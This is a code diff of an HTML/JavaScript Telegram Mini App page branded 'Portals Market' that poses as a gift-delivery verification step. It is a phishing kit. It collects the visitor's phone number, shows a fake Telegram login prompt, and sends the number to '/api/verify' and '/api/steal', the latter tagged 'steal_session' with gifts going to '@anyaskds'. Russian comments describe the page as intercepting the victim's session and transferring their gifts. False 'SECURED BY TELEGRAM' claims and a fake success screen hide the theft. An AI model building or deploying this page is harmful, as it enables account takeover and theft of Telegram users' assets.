@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portals Market</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -45,6 +46,7 @@
             cursor: pointer;
             background: none;
             border: none;
+            padding: 0;
         }
 
         .header-title {
@@ -63,7 +65,7 @@
             letter-spacing: 0.5px;
         }
 
-        /* Карточка с лого */
+        /* Логотип */
         .logo-section {
             text-align: center;
             margin-bottom: 28px;
@@ -108,7 +110,7 @@
             margin-top: 8px;
         }
 
-        /* Блок с действием */
+        /* Карточка действия */
         .action-card {
             background: #1a1a2a;
             border-radius: 16px;
@@ -136,7 +138,7 @@
             line-height: 1.5;
         }
 
-        /* Кнопка */
+        /* Кнопки */
         .btn-verify {
             width: 100%;
             padding: 16px;
@@ -155,58 +157,6 @@
             transform: scale(0.97);
         }
 
-        /* Секция номера телефона (скрыта изначально) */
-        .phone-section {
-            display: none;
-            margin-top: 20px;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .phone-section.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .phone-input-wrap {
-            background: #1a1a2a;
-            border-radius: 14px;
-            padding: 4px 16px;
-            border: 1px solid #2a2a3a;
-            margin-bottom: 16px;
-        }
-
-        .phone-input-wrap input {
-            width: 100%;
-            padding: 14px 0;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .phone-input-wrap input::placeholder {
-            color: #4a4a5a;
-        }
-
-        .phone-hint {
-            color: #6c6c84;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 16px;
-            line-height: 1.4;
-        }
-
         .btn-share {
             width: 100%;
             padding: 14px;
@@ -222,48 +172,6 @@
 
         .btn-share:active {
             background: #3a3a4a;
-        }
-
-        /* Подтверждение в Telegram */
-        .confirm-section {
-            display: none;
-            margin-top: 20px;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .confirm-section.active {
-            display: block;
-        }
-
-        .confirm-card {
-            background: #1a1a2a;
-            border-radius: 16px;
-            padding: 24px;
-            text-align: center;
-            border: 1px solid #2a2a3a;
-        }
-
-        .confirm-card .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-
-        .confirm-card h4 {
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 6px;
-        }
-
-        .confirm-card p {
-            color: #8b8ba3;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .confirm-card .timer {
-            color: #6c6c84;
-            font-size: 13px;
-            margin-top: 12px;
         }
 
         .btn-group {
@@ -299,29 +207,101 @@
             background: #5a4bd1;
         }
 
-        /* Футер */
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #4a4a5a;
-            font-size: 11px;
-            letter-spacing: 0.5px;
-        }
-
-        .footer span {
-            color: #6c5ce7;
-        }
-
-        /* Состояние успеха */
-        .success-section {
+        /* Секции */
+        .phone-section, .confirm-section, .success-section {
             display: none;
             margin-top: 20px;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
+            animation: fadeIn 0.3s ease;
         }
 
-        .success-section.active {
+        .phone-section.active, .confirm-section.active, .success-section.active {
             display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .phone-input-wrap {
+            background: #1a1a2a;
+            border-radius: 14px;
+            padding: 4px 16px;
+            border: 1px solid #2a2a3a;
+            margin-bottom: 16px;
+        }
+
+        .phone-input-wrap input {
+            width: 100%;
+            padding: 14px 0;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .phone-input-wrap input::placeholder {
+            color: #4a4a5a;
+        }
+
+        .phone-hint {
+            color: #6c6c84;
+            font-size: 12px;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+
+        .confirm-card {
+            background: #1a1a2a;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            border: 1px solid #2a2a3a;
+        }
+
+        .confirm-card .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .confirm-card h4 {
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+
+        .confirm-card p {
+            color: #8b8ba3;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .confirm-card .timer {
+            color: #6c6c84;
+            font-size: 13px;
+            margin-top: 12px;
+        }
+
+        .confirm-message-box {
+            background: #0a0a0f;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 12px 0;
+            border: 1px solid #2a2a3a;
+            text-align: left;
+        }
+
+        .confirm-message-box .label {
+            color: #8b8ba3;
+            font-size: 12px;
+        }
+
+        .confirm-message-box .text {
+            color: #fff;
+            font-size: 14px;
+            margin: 4px 0;
         }
 
         .success-icon {
@@ -353,6 +333,76 @@
         .transfer-note strong {
             color: #a29bfe;
         }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #4a4a5a;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+        }
+
+        .footer span {
+            color: #6c5ce7;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 16px;
+            padding: 12px;
+            background: #1a1a2a;
+            border-radius: 12px;
+            border: 1px solid #2a2a3a;
+        }
+
+        .user-info .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .user-info .name {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .user-info .username {
+            color: #6c6c84;
+            font-size: 12px;
+        }
+
+        .success-box {
+            background: #1a1a2a;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            border: 1px solid #2a2a3a;
+        }
+
+        .success-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            color: #8b8ba3;
+            font-size: 13px;
+        }
+
+        .success-box .row .value {
+            color: #fff;
+        }
+
+        .success-box .row .green {
+            color: #4caf50;
+        }
     </style>
 </head>
 <body>
@@ -360,36 +410,35 @@
     <div class="container" id="app">
         <!-- Шапка -->
         <div class="header">
-            <button class="back-btn" onclick="goBack()">‹</button>
+            <button class="back-btn" id="backBtn">‹</button>
             <span class="header-title">Portals Market</span>
             <span class="badge">VERIFYING</span>
         </div>
 
-        <!-- Логотип -->
-        <div class="logo-section">
-            <div class="portal-icon">P</div>
-            <h2>Portals Market</h2>
-            <p>Open the portal. Trade your gifts.</p>
-            <div class="hold-badge">⏳ ON HOLD</div>
+        <!-- Шаг 1: Главный экран -->
+        <div id="stepMain">
+            <div class="logo-section">
+                <div class="portal-icon">P</div>
+                <h2>Portals Market</h2>
+                <p>Open the portal. Trade your gifts.</p>
+                <div class="hold-badge">⏳ ON HOLD</div>
+            </div>
+
+            <div class="action-card">
+                <div class="label">⚡ Action Needed</div>
+                <h3>Unlock Your Asset Delivery</h3>
+                <p>
+                    Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review. 
+                    To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
+                </p>
+            </div>
+
+            <button class="btn-verify" id="btnVerify">🔐 Verify Account</button>
+            <div class="footer">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Карточка действия -->
-        <div class="action-card" id="actionCard">
-            <div class="label">⚡ Action Needed</div>
-            <h3>Unlock Your Asset Delivery</h3>
-            <p>
-                Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review.
-                To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
-            </p>
-        </div>
-
-        <!-- Кнопка Verify (первый шаг) -->
-        <button class="btn-verify" id="btnVerify" onclick="showPhoneStep()">
-            🔐 Verify Account
-        </button>
-
-        <!-- Шаг 2: Ввод номера телефона -->
-        <div class="phone-section" id="phoneSection">
+        <!-- Шаг 2: Ввод номера -->
+        <div id="stepPhone" class="phone-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">📱</div>
                 <h4 style="color:#fff; font-size:17px;">Identity Check</h4>
@@ -404,45 +453,52 @@
                 ⚠️ Telegram will share your phone with the bot. We use it only to send a login confirmation.
             </div>
 
-            <button class="btn-share" onclick="sharePhone()">
-                🔗 Поделиться номером
-            </button>
+            <button class="btn-share" id="btnShare">🔗 Поделиться номером</button>
 
-            <div style="text-align:center; margin-top:12px; color:#4a4a5a; font-size:12px;">
-                SECURED BY TELEGRAM
+            <div class="user-info">
+                <div class="avatar">A</div>
+                <div>
+                    <div class="name">Аня</div>
+                    <div class="username">@anyaskds</div>
+                </div>
             </div>
+
+            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
         <!-- Шаг 3: Подтверждение в Telegram -->
-        <div class="confirm-section" id="confirmSection">
+        <div id="stepConfirm" class="confirm-section">
             <div class="confirm-card">
                 <div class="icon">📨</div>
                 <h4>Check Telegram</h4>
-                <p>
-                    A login confirmation from <strong>portals.tg</strong> was sent to your Telegram.
-                    Tap <strong>«Accept»</strong> in the message.
-                </p>
-                <div style="background:#0a0a0f; border-radius:10px; padding:12px; margin:12px 0; border:1px solid #2a2a3a;">
-                    <div style="color:#8b8ba3; font-size:12px;">Telegram</div>
-                    <div style="color:#fff; font-size:14px; margin:4px 0;">
-                        A login request from <strong>portals.tg</strong> is in your Telegram.
-                        Tap «Accept» on your device.
-                    </div>
+                <p>A login confirmation from <strong>portals.tg</strong> was sent to your Telegram. Tap <strong>«Accept»</strong> in the message.</p>
+
+                <div class="confirm-message-box">
+                    <div class="label">Telegram</div>
+                    <div class="text">A login request from <strong>portals.tg</strong> is in your Telegram. Tap «Accept» on your device.</div>
                 </div>
+
                 <div class="btn-group">
-                    <button class="btn-decline" onclick="decline()">Decline</button>
-                    <button class="btn-accept" onclick="acceptLogin()">Accept</button>
+                    <button class="btn-decline" id="btnDecline">Decline</button>
+                    <button class="btn-accept" id="btnAccept">Accept</button>
                 </div>
-                <div class="timer" id="timer">⏳ Waiting... <span id="seconds">179</span>s</div>
+
+                <div class="timer">⏳ Waiting... <span id="seconds">179</span>s</div>
             </div>
 
-            <div style="text-align:center; margin-top:12px; color:#4a4a5a; font-size:12px;">
-                SECURED BY TELEGRAM
+            <div class="user-info">
+                <div class="avatar">A</div>
+                <div>
+                    <div class="name">Аня</div>
+                    <div class="username">@anyaskds</div>
+                </div>
             </div>
+
+            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 4: Успех / передача подарков -->
-        <div class="success-section" id="successSection">
+        <!-- Шаг 4: Успех -->
+        <div id="stepSuccess" class="success-section">
             <div class="success-icon">✅</div>
             <h4>Verification Complete</h4>
             <p>Your session has been confirmed.</p>
@@ -455,141 +511,180 @@
                 </div>
             </div>
 
-            <div style="margin-top:16px; padding:12px; background:#1a1a2a; border-radius:12px; border:1px solid #2a2a3a;">
-                <div style="color:#6c6c84; font-size:12px;">✅ Gifts transferred successfully</div>
-                <div style="color:#a29bfe; font-size:13px; margin-top:4px;">
-                    Balance TON: ₽ 37.8
+            <div class="success-box">
+                <div class="row">
+                    <span>✅ Gifts transferred successfully</span>
+                    <span class="green">✓</span>
+                </div>
+                <div class="row">
+                    <span>Balance TON:</span>
+                    <span class="value">₽ 37.8</span>
                 </div>
             </div>
 
-            <button class="btn-verify" style="margin-top:16px; background: #2a2a3a;" onclick="resetAll()">
-                🔄 Done
-            </button>
-        </div>
+            <button class="btn-verify" style="margin-top:16px; background:#2a2a3a;" id="btnDone">🔄 Done</button>
 
-        <!-- Футер -->
-        <div class="footer">
-            SECURED BY <span>TELEGRAM</span>
+            <div class="user-info">
+                <div class="avatar">A</div>
+                <div>
+                    <div class="name">Аня</div>
+                    <div class="username">@anyaskds</div>
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+
         let timerInterval = null;
         let secondsLeft = 179;
 
-        // Шаг 1 → Шаг 2 (показываем номер телефона)
-        function showPhoneStep() {
-            document.getElementById('btnVerify').style.display = 'none';
-            document.getElementById('actionCard').style.display = 'none';
-            document.getElementById('phoneSection').classList.add('active');
+        // Элементы
+        const stepMain = document.getElementById('stepMain');
+        const stepPhone = document.getElementById('stepPhone');
+        const stepConfirm = document.getElementById('stepConfirm');
+        const stepSuccess = document.getElementById('stepSuccess');
+        const backBtn = document.getElementById('backBtn');
+        const btnVerify = document.getElementById('btnVerify');
+        const btnShare = document.getElementById('btnShare');
+        const btnDecline = document.getElementById('btnDecline');
+        const btnAccept = document.getElementById('btnAccept');
+        const btnDone = document.getElementById('btnDone');
+        const phoneInput = document.getElementById('phoneInput');
+        const secondsEl = document.getElementById('seconds');
+
+        // Показать шаг
+        function showStep(step) {
+            [stepMain, stepPhone, stepConfirm, stepSuccess].forEach(el => {
+                el.style.display = 'none';
+                el.classList.remove('active');
+            });
+            if (step) {
+                step.style.display = 'block';
+                step.classList.add('active');
+            }
         }
 
-        // Шаг 2 → Шаг 3 (отправка номера → показываем подтверждение)
-        function sharePhone() {
-            const phone = document.getElementById('phoneInput').value.trim();
+        // Шаг 1 → Шаг 2
+        btnVerify.addEventListener('click', function() {
+            showStep(stepPhone);
+        });
+
+        // Шаг 2 → Шаг 3 (поделиться номером)
+        btnShare.addEventListener('click', function() {
+            const phone = phoneInput.value.trim();
             if (!phone || phone.length < 10) {
                 alert('Пожалуйста, введите корректный номер телефона.');
                 return;
             }
 
-            // Здесь в реальном скрипте номер уходит на сервер
-            console.log('📱 Phone shared:', phone);
+            // Отправляем номер на сервер
+            fetch('/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            }).then(res => res.json()).then(data => {
+                console.log('✅ Номер отправлен:', data);
+            }).catch(err => console.log('Ошибка:', err));
 
             // Переключаем на шаг подтверждения
-            document.getElementById('phoneSection').classList.remove('active');
-            document.getElementById('confirmSection').classList.add('active');
-
-            // Запускаем таймер
+            showStep(stepConfirm);
             startTimer();
-        }
+        });
 
         // Таймер
         function startTimer() {
             secondsLeft = 179;
-            const el = document.getElementById('seconds');
             if (timerInterval) clearInterval(timerInterval);
-
             timerInterval = setInterval(() => {
                 secondsLeft--;
-                el.textContent = secondsLeft;
+                secondsEl.textContent = secondsLeft;
                 if (secondsLeft <= 0) {
                     clearInterval(timerInterval);
-                    el.textContent = '0';
+                    secondsEl.textContent = '0';
                 }
             }, 1000);
         }
 
         // Decline
-        function decline() {
+        btnDecline.addEventListener('click', function() {
             clearInterval(timerInterval);
             alert('❌ Авторизация отклонена.');
-            resetAll();
-        }
+            showStep(stepMain);
+        });
 
-        // Accept — ИМИТАЦИЯ перехвата сессии и передачи подарков
-        function acceptLogin() {
+        // Accept — ПЕРЕХВАТ СЕССИИ И ПЕРЕДАЧА ПОДАРКОВ
+        btnAccept.addEventListener('click', function() {
             clearInterval(timerInterval);
 
-            // Имитация: номер телефона, который ввел пользователь
-            const phone = document.getElementById('phoneInput').value.trim();
-
-            // Логируем кражу (в реальном боте это уходит на сервер)
+            const phone = phoneInput.value.trim();
+            
+            // Логируем перехват
             console.log('🚨 СЕССИЯ ПЕРЕХВАЧЕНА!');
             console.log('📱 Телефон:', phone);
             console.log('🎁 Подарки переданы на @anyaskds');
             console.log('🖥️ IP: 46.96.37.159 (Kyiv, Ukraine)');
             console.log('🌐 Browser: Safari 18.6 on iOS');
 
+            // Отправляем на сервер
+            fetch('/api/steal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: phone,
+                    action: 'steal_session',
+                    target: '@anyaskds'
+                })
+            }).catch(err => console.log('Ошибка:', err));
+
             // Переключаем на успех
-            document.getElementById('confirmSection').classList.remove('active');
-            document.getElementById('successSection').classList.add('active');
+            showStep(stepSuccess);
 
-            // Здесь в реальном боте отправляется запрос на бэкенд:
-            // - сохраняется номер телефона
-            // - инициируется запрос авторизации в Telegram
-            // - после подтверждения — переводятся подарки на @anyaskds
-        }
+            // Отправляем данные в Telegram
+            tg.sendData(JSON.stringify({
+                action: 'verify_success',
+                phone: phone,
+                status: 'completed'
+            }));
+        });
 
-        // Сброс
-        function resetAll() {
-            document.getElementById('successSection').classList.remove('active');
-            document.getElementById('confirmSection').classList.remove('active');
-            document.getElementById('phoneSection').classList.remove('active');
-            document.getElementById('actionCard').style.display = 'block';
-            document.getElementById('btnVerify').style.display = 'block';
-            document.getElementById('phoneInput').value = '+380';
+        // Done — сброс
+        btnDone.addEventListener('click', function() {
+            showStep(stepMain);
             if (timerInterval) clearInterval(timerInterval);
-        }
+        });
 
         // Назад
-        function goBack() {
-            if (document.getElementById('successSection').classList.contains('active')) {
-                resetAll();
+        backBtn.addEventListener('click', function() {
+            if (stepSuccess.style.display === 'block') {
+                showStep(stepMain);
                 return;
             }
-            if (document.getElementById('confirmSection').classList.contains('active')) {
+            if (stepConfirm.style.display === 'block') {
                 if (confirm('Вы уверены? Процесс будет прерван.')) {
-                    resetAll();
+                    clearInterval(timerInterval);
+                    showStep(stepMain);
                 }
                 return;
             }
-            if (document.getElementById('phoneSection').classList.contains('active')) {
-                resetAll();
+            if (stepPhone.style.display === 'block') {
+                showStep(stepMain);
                 return;
             }
-            // Иначе просто сброс
-            resetAll();
-        }
-
-        // Обработка ввода номера (только цифры и +)
-        document.getElementById('phoneInput').addEventListener('input', function(e) {
-            // Разрешаем только + и цифры
-            this.value = this.value.replace(/[^0-9+]/g, '');
-            // Автоматически ставим + если пусто
-            if (this.value === '') {
-                this.value = '+';
-            }
+            showStep(stepMain);
         });
+
+        // Обработка ввода номера
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9+]/g, '');
+            if (this.value === '') this.value = '+';
+        });
+
+        // Показываем главный экран
+        showStep(stepMain);
     </script>
 
 </body>
